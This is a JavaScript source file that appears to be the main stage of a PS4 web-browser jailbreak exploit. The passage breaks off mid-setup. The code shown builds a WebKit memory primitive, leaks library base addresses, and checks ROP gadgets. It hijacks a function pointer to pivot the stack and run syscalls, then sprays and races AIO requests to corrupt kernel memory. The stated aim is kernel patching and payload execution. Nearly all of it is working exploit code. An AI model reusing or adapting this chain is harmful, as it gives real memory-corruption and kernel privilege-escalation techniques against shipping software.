import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { LAPSE_SYS as SYS } from "./module/constants.js";
import { checkJailbroken } from "./check-jailbroken.js";
import { validateGadgets, discoverStubs } from "./module/gadgets.js";
import { createContext, breathe } from "./module/rop.js";
import { bufferAddress } from "./module/syscall.js";
import { kpatchPath, loadBinary, loadPayload, kpatchJmpSites } from "./module/assets.js";
import { runChain, mark, state, check, post, checkCounts, hx, hexByte, hexBytes, makePrimitiveProgress } from "./module/log.js";
import { isKernelPtr, isPtrish, isImageAddr, isPlausibleBase, sameI64 } from "./module/addr.js";
import { resolvePthreadCreate, readSysentEntry, writeSysentEntry, armSysentEntry, readByte, isGateableJumpByte, mapRwxAtFixedAddress, mapAnonymousRwx, launchThread, copyBlobToKernel, rwxSizeFor } from "./post-exploit.js";
import { makeRpc, DEFAULT_RPC_TIMEOUT_MS } from "./workers.js";

const passCount = () => checkCounts().passCount;
const failCount = () => checkCounts().failCount;

/*
FIRMWARE RESOLVER.

offsetsFor() lives in main.js now -- it is app wiring, and offset.js is pure
data. main.js imports PS4 from ./offset.js, builds the resolver and publishes
it as window.offsetsFor BEFORE it calls mod.run(), so by the time this chain
runs the global is present.

The wrapper exists so the four call sites below keep their exact shape, and so
a missing global is one clear message instead of a ReferenceError somewhere
inside the exploit.
*/
function offsetsFor(ua) {
    if (typeof window === "undefined" || typeof window.offsetsFor !== "function")
        throw new Error("offsetsFor is not installed -- main.js must run before "
            + "the exploit chain (it publishes window.offsetsFor from the PS4 "
            + "table in src/offset.js)");
    return window.offsetsFor(ua);
}

export function run(options) {
    return runChain({
        ...options,
        postPrefix: "PS4-S4R",
        // posts the terse detail, unlike netctrl which posts the raw one
        badRe: /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i,
        warnRe: /SKIP|GAP|WOULD-HAVE-WON|WARN/i,
        okRe: /OK|PROVEN|READY|pass|BASELINE/i,
    }, runOriginal);
}
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}
const AF_INET = 2, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const IPPROTO_TCP = 6, TCP_INFO = 32, TCP_INFO_SIZE = 0xec, TCPS_ESTABLISHED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000, AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const NUM_REQS = 3, WORKER_NUM = 2, AIO_MAX_NUM = 0x80;
const AIO_RW_REQ_SIZE = 0x28, AIO_RW_REQ_NBYTE = 0x08, AIO_RW_REQ_FD = 0x20;
const MAIN_CORE = 7, RTP = 0x100, RTP_PRIO_REALTIME = 2;
const RTP_LOOKUP = 0, RTP_SET = 1;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = 0xa;
const SENT_LO = 0xc0de4e01, SENT_HI = 0x4eecafe0;
const AF_INET6 = 28, SOCK_DGRAM = 2;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const IPV6_SOCK_NUM = 0x80;
const RTHDR_SIZE = 0x80;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const IPV6_2292PKTOPTIONS = 25, IPV6_TCLASS = 61;
const IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;

const SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
const PEER_RCVBUF = 0x400, CLIENT_SNDBUF = 0x8000;

const PKTOPTS_PKTINFO = 0x10, PKTOPTS_TCLASS = 0xb0;
const KARW_MARKER = 0x1337;

const REQS3_OFF = 0x28;
const AR3_NUM_REQS = 0x00, AR3_REQS_LEFT = 0x04, AR3_STATE = 0x08;
const AR3_DONE = 0x0c, AR3_LOCK_FLAGS = 0x28, AR3_LOCK = 0x38;
const AIO_CMD_WRITE = 2;
const HANDLES_NUM = 0x100;
const LEAK_NUM_REQS = 6;
const EVF_ATTEMPTS = 0x80;

const AR2_CMD = 0x00, AR2_REQS1 = 0x10, AR2_INFO = 0x18;
const AR2_BATCH = 0x20, AR2_RESULT_STATE = 0x38;
const AR2_RESULT_PAD = 0x3c, AR2_FILE = 0x40, AR2_UNK2 = 0x48;
const AR2_QENTRY = 0x50, AIO_ENTRY_SIZE = 0x80;

const keepAlive = [];
let execAddr = null, origNative = null, mFunctionPatched = false;
let mainPivotAddr = null, mainSavedCell = null, cellCorrupted = false;
let workerArmed = false, workerWired = false, rpc = null;
let wMasterAddr = null, origWorkerVector = null;
let savedMask = null, maskChanged = false;
let savedPrio = null, prioChanged = false;
let restoreCtx = null;

let committed = false, rebootRequired = false;
let pipeM = null, pipeS = null;

let kFdtOfiles = null, pipeMFp = null, pipeSFp = null;

let kLeakFp = null;
let kv = null;

let repaired = false, cleanupDone = false;

let jailbroken = false, kpatched = false, payloadRunning = false;
let pipeFdsHeld = null;

let kvProbe = null;

let committed2 = false;
const pktoptsTwins = [];
const ipv6Socks = [];
const twinSocks = [];
const openFds = [];
const liveAioIds = [];

async function runOriginal() {
    let worker = null;
    let p = null, sc = null, stubOf = null;
    let runFailed = false;
    try {
        const params = new URLSearchParams(location.search);

        const fwResolved = offsetsFor(navigator.userAgent);
        const fwKey = fwResolved.key;
        // off.kpatch wins when a firmware shares another's kernel and therefore
        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
        const kpatchName = kpatchPath(fwKey, fwResolved.off);
        let kpatch = null;
        try {
            if (kpatchName) kpatch = await loadBinary(kpatchName);
        } catch (e) {
            mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }

        const KPATCH_JMP_SITES = kpatch ? kpatchJmpSites(kpatch) : [];
        mark("KPATCH-BLOB", kpatch
            ? kpatch.length + " bytes of " + kpatchName + " in hand, head "
            + hexBytes(kpatch.subarray(0, 12))
            + "   " + KPATCH_JMP_SITES.length + " gateable jump site(s): "
            + KPATCH_JMP_SITES.slice(0, 12)
                .map(function (v) { return "0x" + v.toString(16); }).join(" ")
            : (kpatchName ? "NOT LOADED (" + kpatchName + ") -- stage 9 will not run"
                : "no firmware key, so no blob name -- stage 9 will not run"));

        let payload = null;
        try {
            payload = await loadPayload();
        } catch (e) {
            mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12))
            + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
                : " entry=NOT-e9")
            : "NOT LOADED -- stage 10 will not run");

        const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
        const SPRAY_NUM = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x200;

        const STOP_PRECOMMIT = params.get("stop") === "precommit";

        /*
        Per-flush KernelView tracing. Off by default: it emits three lines per
        flush, and a healthy run does ~260 flushes. Turn on with ?kvflush=1 if
        "building KernelView..." ever parks again -- the last line printed names
        the syscall that did it.
        */
        const KV_FLUSH_TRACE = params.get("kvflush") === "1";

        const PATCH_SETTLE = params.has("patchsettle")
            ? parseInt(params.get("patchsettle"), 10) : 2000;
        const PAYLOAD_SETTLE = params.has("payloadsettle")
            ? parseInt(params.get("payloadsettle"), 10) : 2000;

        let settleTs = null;
        function settle(ms) {
            if (!(ms > 0) || !settleTs) return;
            settleTs.u8.fill(0);
            settleTs.dv.setUint32(0, Math.floor(ms / 1000), true);
            settleTs.dv.setUint32(8, (ms % 1000) * 1000000, true);
            sc(SYS.nanosleep, settleTs.addr, 0);
        }

        const ua = navigator.userAgent;
        const { key, off } = offsetsFor(ua);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
            state("no offsets for this firmware", "bad");
            return { success: false, reason: "unsupported firmware" };
        }

        mark("FW-STATUS", key + " -- " + (off.fw_status
            || "no status recorded in the offsets block."));
        mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
            + (STOP_PRECOMMIT
                ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
                + "WITHHELD. Nothing is freed twice and no reboot is owed."
                : "  -- ARMED: the worker issues a REAL aio_multi_delete"));

        state("running the primitive...", "warn");

        await new Promise(function (r) { setTimeout(r, 0); });
        /*
        USERLAND UX. This used to mark() EVERY event the primitive emits, which
        floods the log at the exact moment the user needs to see the outcome.
        makePrimitiveProgress gives the same live attempt N/M status as netctrl
        plus a bounded set of phase/retry marks, and sends the rest to the XHR.
        */
        const progress = makePrimitiveProgress(6);
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: progress.onEvent
        });
        progress.done("ok");
        /*
        Keep showing pair/promote progress. installWindowP forwards
        opts.onEvent to promoteToRealPair, which calls it as
        onEvent(tag, detail) -- two args, no attempt number. Without this the
        whole promotion phase was silent in lapse (netctrl already passes it),
        so the page went quiet between "primitive established" and the first
        PAIR-STATUS mark.
        */
        installWindowP(carrier, { promote: true, onEvent: progress.onEvent });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage);
        mark("PRIMITIVE-OK", "");

        const fnAddr = p.leakval(Math.expm1);
        execAddr = p.read8(fnAddr.add32(0x18));
        const nativeFn = p.read8(execAddr.add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const g = function (rva) { return webkitBase.add32(rva); };
        const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        if (!isPlausibleBase(webkitBase) || !isPlausibleBase(libkernelBase)) {
            state("a base looks wrong", "bad"); return;
        }

        const GADGETS = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3], false, true],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3], false, true],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3], false, true],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3], false, true],
            ["POP_R8_RET", off.wk_POP_R8_RET, [0x41, 0x58, 0xc3], true, true],
            ["POP_R9_RET", off.wk_POP_R9_RET, [0x41, 0x59, 0xc3], true, false],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3], false, true],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3], false, true],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                [0x48, 0x89, 0x07, 0xc3], false, true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], false, true],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL,
                [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10], false, true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18,
                [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18], false, true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10,
                [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,
                [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20], false, true],

            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                [0x48, 0x8b, 0x50, off.pivot_view_sp,
                    0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true]
        ];
        const G = {};
        {
            const result = validateGadgets(p, webkitBase, GADGETS, hexBytes, mark);
            Object.assign(G, result.gadgets);
            var fatal = result.fatal, gated = result.gated;
        }
        check("gadget-table-fits-module", !fatal,
            gated + "/" + GADGETS.length + " gated");
        if (fatal) { state("gadget bytes did not match", "bad"); return; }
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
        if (!argGadget[4]) { state("no pop r8", "bad"); return; }

        const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
        state("scanning libkernel for syscall stubs...", "warn");
        const tScan = Date.now();
        const scan = discoverStubs(p, libkernelBase, off, SYS, {
            extra: SYS9, requirePlain: true
        });
        const stubRva = scan.stubRva, stubAddr = scan.stubAddr;
        if (off.k_stubs)
            mark("STUB-TABLE", "seeded=" + scan.seeded + "/"
                + Object.keys(off.k_stubs).length + " rejected=" + scan.seedBad);
        mark("STUB-SCAN", stubRva.size + "/"
            + (Object.keys(SYS).length + Object.keys(SYS9).length) + " in "
            + (Date.now() - tScan) + " ms");
        const missing = scan.missing;
        check("syscall-race-needs-plain-stub",
            missing.length === 0,
            missing.length ? "missing: " + missing.join(",")
                : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
        if (missing.length) { state("missing syscall stubs", "bad"); return; }

        mark("STAGE9-STUBS", scan.extraStatus.join("  "));

        function bufAddr(ab) {
            return bufferAddress(p, off, ab);
        }
        function eq(a, b) { return a.low === b.low && a.hi === b.hi; }

        function makeCtx(tag) {
            return createContext({
                p: p, offsets: off, gadgets: G, keepAlive: keepAlive,
                tag: tag, validate: true
            });
        }
        const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
        check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }

        function layout(c, insts, targetIdx) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            let at = 0x2000 - 8 * insts.length;
            if (targetIdx >= 0 && (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0)) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }

        function chain(c) {
            const insts = [];
            let targetIdx = -1;
            const b = {
                store: function (addr, v) {
                    insts.push(G.POP_RAX_RET); insts.push(v);
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                args: function (list) {
                    for (let i = 0; i < list.length; ++i) {
                        insts.push(argGadget[i]); insts.push(list[i]);
                    }
                    return b;
                },
                call: function (target) {

                    const idx = insts.length;
                    if (targetIdx < 0) targetIdx = idx;
                    else if (((idx - targetIdx) & 1) !== 0)
                        throw new Error("chain: call slots " + targetIdx
                            + " and " + idx + " differ in parity, so one of "
                            + "them would be misaligned");
                    insts.push(target); return b;
                },
                saveRax: function (addr) {
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                end: function () {
                    insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
                    insts.push(G.LEAVE_RET);
                    return { insts: insts, targetIdx: targetIdx };
                }
            };
            return b;
        }
        function callInsts(c, target, args) {
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            return { insts: insts, targetIdx: targetIdx };
        }

        const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
        origNative = p.read8(mFuncAt);
        if (!sameI64(origNative, nativeFn)) {
            state("m_function moved under us", "bad"); return;
        }
        const mainPivotObj = {};
        keepAlive.push(mainPivotObj);
        mainPivotAddr = p.leakval(mainPivotObj);
        mainSavedCell = p.read8(mainPivotAddr);
        p.write8(mFuncAt, G.G0);
        mFunctionPatched = true;

        function fireMain(insts, targetIdx) {
            layout(mainCtx, insts, targetIdx);
            cellCorrupted = true;
            p.write8(mainPivotAddr, mainCtx.S);
            Math.expm1(mainPivotObj);
            p.write8(mainPivotAddr, mainSavedCell);
            cellCorrupted = false;
        }
        sc = function (num) {
            const args = Array.prototype.slice.call(arguments, 1);
            const t = stubAddr.get(num);
            if (!t) throw new Error("no stub for syscall " + num);
            const b = callInsts(mainCtx, t, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        };

        const rawSyscallAt = stubAddr.get(SYS.getpid).add32(7);
        function scRaw(num) {
            if (!rawSyscallAt) throw new Error("no raw syscall entry");
            const args = Array.prototype.slice.call(arguments, 1);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            insts.push(G.POP_RAX_RET); insts.push(num);
            const targetIdx = insts.length;
            insts.push(rawSyscallAt);
            insts.push(G.POP_RDI_RET); insts.push(mainCtx.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            fireMain(insts, targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }
        function scAny(num) {
            return stubAddr.has(num) ? sc.apply(null, arguments)
                : scRaw.apply(null, arguments);
        }

        function callAddr(target) {
            const args = Array.prototype.slice.call(arguments, 1);
            const b = callInsts(mainCtx, target, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }

        layout(mainCtx, [G.POP_RDI_RET, mainCtx.F.add32(8), G.MOV_RDI_RAX_RET,
        G.POP_RAX_RET, JSVALUE_UNDEFINED, G.LEAVE_RET], -1);
        cellCorrupted = true;
        p.write8(mainPivotAddr, mainCtx.S);
        Math.expm1(mainPivotObj);
        p.write8(mainPivotAddr, mainSavedCell);
        cellCorrupted = false;
        const wit = new int64(mainCtx.frameDv.getUint32(8, true),
            mainCtx.frameDv.getUint32(12, true));
        check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
            wit + " want " + mainCtx.P);
        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
        const jb = checkJailbroken({ sc, sys: SYS, mark, state });
        if (jb.alreadyJailbroken) {
            return {
                success: false, alreadyJailbroken: true,
                reason: "console is already jailbroken"
            };
        }

        function alloc(len) {
            const ab = new ArrayBuffer(len);
            const rec = {
                ab: ab, dv: new DataView(ab), u8: new Uint8Array(ab),
                addr: bufAddr(ab), len: len
            };
            keepAlive.push(ab, rec.dv, rec.u8);
            return rec;
        }
        const reqs1 = alloc(AIO_RW_REQ_SIZE * AIO_MAX_NUM);
        const outs = alloc(AIO_MAX_NUM * 4);
        const aioIds = alloc(NUM_REQS * 4);
        const sprayIds = alloc(SPRAY_NUM * 4);
        const blockIds = alloc(4);
        const servAddr = alloc(16);
        const lingerBuf = alloc(8);
        const optval = alloc(4);
        const info = alloc(TCP_INFO_SIZE);
        const infoLen = alloc(4);
        const maskBuf = alloc(0x10);

        const shared = alloc(0x40);
        const tsBuf = alloc(0x10);
        settleTs = alloc(0x10);
        const prioBuf = alloc(4);

        restoreCtx = { maskBuf: maskBuf, prioBuf: prioBuf };
        mark("BUFFERS", "reqs1=" + reqs1.addr + " outs=" + outs.addr
            + " aio_ids=" + aioIds.addr);

        function buildReqs1(count, fd) {
            reqs1.u8.fill(0);
            for (let i = 0; i < count; ++i) {
                const o = i * AIO_RW_REQ_SIZE;
                reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, fd === -1 ? 0 : 1, true);
                reqs1.dv.setInt32(o + AIO_RW_REQ_FD, fd, true);
            }
        }

        prioBuf.dv.setUint16(0, 0xffff, true);
        prioBuf.dv.setUint16(2, 0xffff, true);
        const prioLookup = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioBuf.addr).i32;
        savedPrio = [prioBuf.dv.getUint16(0, true), prioBuf.dv.getUint16(2, true)];
        maskBuf.u8.fill(0);
        const affLookup = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskBuf.addr).i32;
        savedMask = new int64(maskBuf.dv.getUint32(0, true),
            maskBuf.dv.getUint32(4, true));
        check("inherited-thread-attributes-read",
            prioLookup === 0 && affLookup === 0,
            "prio {" + savedPrio + "}  mask " + savedMask
            + "  (cores " + (function () {
                const c = [];
                for (let i = 0; i < 32; ++i)
                    if (savedMask.low & (1 << i)) c.push(i);
                return c.join(",");
            })() + " are available to this process)");

        state("wiring the worker...", "warn");
        worker = new Worker("src/worker.js");
        rpc = makeRpc(worker, "lapse", DEFAULT_RPC_TIMEOUT_MS,
            (n, msg) => mark("WORKER-ONERROR", n + " " + msg));
        await rpc("ping", DEFAULT_RPC_TIMEOUT_MS);
        const markerArr = await rpc("init", DEFAULT_RPC_TIMEOUT_MS, SENT_LO, SENT_HI);
        keepAlive.push(markerArr);
        const D = bufAddr(markerArr.buffer);
        if ((p.read4(D) >>> 0) !== SENT_LO) {
            check("transferred-store-worker-memory", false, "D=" + D);
            state("transfer did not preserve the store", "bad"); return;
        }
        const ptrish = isPtrish;
        const storage = p.read8(D.add32(0x10));
        const markerCell = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!markerCell || !ptrish(markerCell)) {
            check("walk-reached-worker-marker", false,
                "storage=" + storage + " cell=" + markerCell);
            state("walk failed -- run step 4b for the dump", "bad"); return;
        }
        const butterfly = p.read8(markerCell.add32(8));
        let wMaster = null, wVictim = null, wLeak = null;
        for (let k = 1; k <= 8; ++k) {
            const val = p.read8(butterfly.sub32(8 * k));
            if (!ptrish(val)) continue;
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (inl.hi === 0 && inl.low === 2) { if (!wLeak) wLeak = val; }
            else if (inl.hi > 0 && len === 6) { if (!wMaster) wMaster = val; }
            else if (inl.hi > 0 && len === 0x30) { if (!wVictim) wVictim = val; }
        }
        check("walk-found-worker-victim-master",
            !!(wMaster && wVictim && wLeak), "master=" + wMaster);
        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
        wMasterAddr = wMaster;
        origWorkerVector = p.read8(wMaster.add32(0x10));
        p.write8(wMaster.add32(0x10), wVictim);
        workerWired = true;
        await rpc("setup", DEFAULT_RPC_TIMEOUT_MS, wLeak.low, wLeak.hi);
        await rpc("armPivot", DEFAULT_RPC_TIMEOUT_MS, G.G0.low, G.G0.hi);
        workerArmed = true;
        mark("WORKER-READY", "wired and armed");

        function fireWorkerAsync(num, args) {
            const t = stubAddr.get(num);
            const b = callInsts(wrkCtx, t, args);
            layout(wrkCtx, b.insts, b.targetIdx);
            return rpc("fire", 0, wrkCtx.S.low, wrkCtx.S.hi);
        }
        function workerRet() {
            return {
                lo: wrkCtx.frameDv.getUint32(0, true),
                hi: wrkCtx.frameDv.getUint32(4, true),
                i32: wrkCtx.frameDv.getUint32(0, true) | 0
            };
        }
        const mainPid = sc(SYS.getpid).i32;
        await fireWorkerAsync(SYS.getpid, []);
        const wpid = workerRet().i32;
        check("worker-calls-kernel-process", wpid === mainPid,
            "worker pid=" + wpid + " main pid=" + mainPid);

        check("worker-answers-before-arm",
            (await rpc("ping", DEFAULT_RPC_TIMEOUT_MS)) === "pong", "");

        state("setting up the aio batches...", "warn");
        const pairBuf = alloc(8);
        if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
            throw new Error("socketpair failed");
        const blockSs = [pairBuf.dv.getInt32(0, true), pairBuf.dv.getInt32(4, true)];
        openFds.push(blockSs[0], blockSs[1]);
        mark("BLOCK-SS", blockSs.join(","));

        buildReqs1(WORKER_NUM, blockSs[0]);
        const tBlock = Date.now();
        sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, WORKER_NUM,
            AIO_PRIORITY_HIGH, blockIds.addr);
        const blockId = blockIds.dv.getUint32(0, true);
        mark("BLOCK-AIO", "id=" + hx(blockId) + "  " + (Date.now() - tBlock) + " ms");
        check("blocking-aio-request-accepted", blockId !== 0, "");
        if (blockId !== 0) liveAioIds.push(blockId);

        buildReqs1(NUM_REQS, -1);
        const tSpray = Date.now();
        for (let i = 0; i < SPRAY_NUM; ++i)
            sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, NUM_REQS,
                AIO_PRIORITY_HIGH, sprayIds.addr.add32(i * 4));
        const sprayMs = Date.now() - tSpray;
        let sprayNonZero = 0;
        for (let i = 0; i < SPRAY_NUM; ++i)
            if (sprayIds.dv.getUint32(i * 4, true) !== 0) sprayNonZero++;
        mark("SPRAY-AIO", SPRAY_NUM + " submits, " + sprayNonZero
            + " ids, " + sprayMs + " ms  ("
            + (sprayMs / SPRAY_NUM).toFixed(2) + " ms per ROP syscall)");
        check("spray-submit-returned-id", sprayNonZero === SPRAY_NUM, "");
        for (let i = 0; i < SPRAY_NUM; ++i) liveAioIds.push(sprayIds.dv.getUint32(i * 4, true));

        for (let off2 = 0; off2 < SPRAY_NUM; off2 += AIO_MAX_NUM) {
            const step = Math.min(AIO_MAX_NUM, SPRAY_NUM - off2);
            sc(SYS.aio_multi_cancel, sprayIds.addr.add32(off2 * 4), step, outs.addr);
        }
        mark("SPRAY-CANCELLED", "");

        state("dry run: everything but the racing delete...", "warn");
        servAddr.dv.setUint8(0, 16);
        servAddr.dv.setUint8(1, AF_INET);
        servAddr.dv.setUint16(2, 0x8d13, true);
        servAddr.dv.setUint32(4, 0x0100007f, true);
        lingerBuf.dv.setInt32(0, 1, true);
        lingerBuf.dv.setInt32(4, 1, true);

        const server = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
        openFds.push(server);
        optval.dv.setInt32(0, 1, true);
        sc(SYS.setsockopt, server, SOL_SOCKET, SO_REUSEADDR, optval.addr, 4);
        const br = sc(SYS.bind, server, servAddr.addr, 16).i32;

        optval.dv.setInt32(0, PEER_RCVBUF, true);
        sc(SYS.setsockopt, server, SOL_SOCKET, SO_RCVBUF, optval.addr, 4);
        const lr2 = sc(SYS.listen, server, 1).i32;
        check("loopback-server-socket-bound-listening",
            br === 0 && lr2 === 0, "bind=" + br + " listen=" + lr2
            + " fd=" + server);
        if (br !== 0 || lr2 !== 0) { state("could not set up the server", "bad"); }

        const PIPE_SYS = 42, F_SETFL = 4, O_NONBLOCK = 4;
        const FIONREAD = 0x4004667f;
        const FIONSPACE = 0x4004667e;
        const FIOSETOWN = 0x8004667c;
        const pipeBuf = alloc(16);
        const masterPipe = [-1, -1], slavePipe = [-1, -1], leakPipe = [-1, -1];
        const fcntlRc = [];
        let pipesOk = false, leakPipeOk = false;
        {
            let pipeAt = null;
            for (let o = 0; o < off.k_scan_stage1; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
                    continue;
                const nn = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (nn === PIPE_SYS) { pipeAt = libkernelBase.add32(o); break; }
            }
            if (pipeAt) {
                stubAddr.set(PIPE_SYS, pipeAt);
                const pairs = [masterPipe, slavePipe];
                let made = 0;
                for (let i = 0; i < pairs.length; ++i) {
                    pipeBuf.u8.fill(0);
                    if (sc(PIPE_SYS, pipeBuf.addr).i32 !== 0) break;
                    pairs[i][0] = pipeBuf.dv.getInt32(0, true);
                    pairs[i][1] = pipeBuf.dv.getInt32(4, true);
                    if (pairs[i][0] <= 2 || pairs[i][1] <= 2) break;
                    openFds.push(pairs[i][0], pairs[i][1]);

                    fcntlRc.push(sc(SYS.fcntl, pairs[i][0], F_SETFL, O_NONBLOCK).i32);
                    fcntlRc.push(sc(SYS.fcntl, pairs[i][1], F_SETFL, O_NONBLOCK).i32);
                    made++;
                }
                pipesOk = made === 2;

                if (pipesOk) {
                    pipeBuf.u8.fill(0);
                    if (sc(PIPE_SYS, pipeBuf.addr).i32 === 0) {
                        leakPipe[0] = pipeBuf.dv.getInt32(0, true);
                        leakPipe[1] = pipeBuf.dv.getInt32(4, true);
                        if (leakPipe[0] > 2 && leakPipe[1] > 2) {
                            openFds.push(leakPipe[0], leakPipe[1]);
                            leakPipeOk = true;
                        }
                    }
                }
            }
            check("two-pipe-pairs-created-set", pipesOk,
                "master " + masterPipe + "   slave " + slavePipe
                + (pipeAt ? "" : "  (no mov rax,42 found)"));
            /* -1 on any fcntl and the reference's KernelView constructor throws. */
            check("fcntlf_setfl-o_nonblock-succeeded-four-pipe",
                fcntlRc.length === 4 && fcntlRc.every(function (r) { return r === 0; }),
                "returns {" + fcntlRc + "}");
            /* Without the third pipe, curproc falls back to the aio_info read
               that the 00:38 run found reclaimed. */
            check("third-pipe-exists-carry-ar2_file", leakPipeOk,
                leakPipeOk ? "leak " + leakPipe : "absent");
        }

        const preTs = alloc(0x10);
        const wideBuf = alloc(0x8000);
        wideBuf.u8.fill(0x41);
        const optLen = alloc(4);
        let wideLen = 0, wideWindow = params.get("wide") !== "0";
